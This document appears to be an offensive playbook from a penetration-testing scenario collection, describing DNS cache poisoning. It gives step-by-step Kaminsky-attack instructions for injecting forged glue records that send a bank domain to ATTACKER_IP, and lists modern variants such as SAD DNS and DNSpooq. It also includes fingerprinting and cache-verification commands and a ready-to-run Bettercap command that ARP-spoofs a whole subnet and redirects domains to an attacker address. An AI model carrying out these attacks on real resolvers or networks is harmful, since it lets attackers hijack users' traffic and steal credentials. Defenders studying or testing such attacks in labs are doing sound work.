# DNS Cache Poisoning

## When this applies

- Target is a recursive DNS resolver that other clients query (corporate resolver, ISP resolver, public open resolver).
- Resolver lacks DNSSEC validation, source-port randomization, or 0x20-bit case randomization.
- Goal is to inject a forged record (e.g. `A bank.example.com → 198.51.100.1`) into the resolver's cache so subsequent client queries are served the malicious answer.

## Technique

Race the legitimate authoritative reply with a forged response that matches the resolver's outgoing query parameters (transaction ID + source port + question section). When the forged response arrives first, the resolver caches the bogus record until TTL expiration.

## Steps

### 1. Fingerprint the resolver

```bash
# Identify the resolver
dig @TARGET_RESOLVER version.bind chaos txt
dig @TARGET_RESOLVER version.server chaos txt

# Check DNSSEC support
dig @TARGET_RESOLVER +dnssec example.com

# Check source port randomization (issue many queries, observe outgoing ports)
# Old/misconfigured resolvers reuse a single source port — instant Kaminsky win.
```

### 2. Kaminsky-style attack (classic)

The Kaminsky attack (2008) defeats source-port randomization by spamming the resolver with non-existent subdomain queries and racing each one with forged responses that include a poisoned `Authority` section glue record.

1. Pick a target zone (e.g. `bank.example.com`).
2. From a client, query `<random>.bank.example.com` against the target resolver.
3. Spray UDP/53 forged responses with random transaction IDs back to the resolver. Each response:
   - Answers the random subdomain.
   - In the Authority section, asserts that `ns.bank.example.com` is the NS for `bank.example.com`.
   - In the Additional section, glues `ns.bank.example.com → ATTACKER_IP`.
4. If one forged packet matches the in-flight TXID + source port, the resolver caches the glue. All future queries for `*.bank.example.com` go to ATTACKER_IP.
5. Loop with new random subdomains — each iteration is an independent race, so no cache lock-out.

### 3. Modern variants

- **SAD DNS (CVE-2020-25705)**: side-channel via ICMP rate limit reveals open source ports → defeats port randomization on Linux resolvers without DNSSEC.
- **DNSpooq (CVE-2020-25681..6)**: dnsmasq vulnerabilities allowing collision-based poisoning.
- **TsuNAME**: amplification + cache state confusion.
- **Off-path DNS rebinding via fragmented responses**: forge a UDP fragment that overwrites the Answer section.

### 4. Verification scaffolding

```bash
# Watch resolver cache content (BIND with rndc)
rndc dumpdb -cache && grep bank.example.com /var/cache/bind/named_dump.db

# From a client downstream of the resolver
dig @TARGET_RESOLVER bank.example.com
# expected: forged ATTACKER_IP if poisoning succeeded
```

### 5. Local-network DHCP / DNS spoofing alternative

Within a LAN, ARP spoofing combined with DNS spoofing (Bettercap, Ettercap) is far easier than Kaminsky:

```bash
# Bettercap — caplet for DNS spoofing
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.0/24;
  arp.spoof on;
  set dns.spoof.domains *.target.com;
  set dns.spoof.address ATTACKER_IP;
  dns.spoof on
"
```

This isn't true cache poisoning — it intercepts at L2. See `scenarios/mitm/arp-poisoning.md`.

## Verifying success

- A test client query (`dig @resolver banking.example.com`) returns ATTACKER_IP.
- Resolver cache dump shows the forged record with TTL set by the attack (often 1 day).
- Lasts until the resolver flushes or TTL expires — record the original TTL to predict eviction.

## Common pitfalls

- **DNSSEC-validating resolvers** discard unsigned replies for signed zones. The attack only works on zones without DNSSEC OR resolvers that don't validate.
- **Source-port randomization** is universal in modern resolvers — Kaminsky requires either weak randomness or a side-channel like SAD DNS.
- **0x20-bit case randomization**: some resolvers randomize the case of the query name (`BaNk.ExAmPlE.cOm`) — forged responses must echo the same case to be accepted.
- **Glue records require subdomain match**: Authority/Additional sections are only accepted when in-bailiwick (the NS must be within the zone being queried).
- **Resolver lock-out**: once a record is cached, repeat poisoning attempts have no effect until TTL expiry. Use random subdomain prefixes (`xyz123.bank.example.com`) for each race so every attempt is fresh.
- **Anti-spoofing TTL clamp**: BIND `max-ncache-ttl` and `max-cache-ttl` cap how long forged records survive.

## Tools

- dnsspoof (dsniff suite, simple LAN spoofing)
- Ettercap, Bettercap (LAN DNS+ARP combination)
- scapy (manual response crafting for Kaminsky-style attacks)
- DNSChef (DNS proxy with rule-based response rewriting)
- whonow (rebinding DNS, useful for rebinding-as-poisoning hybrids)
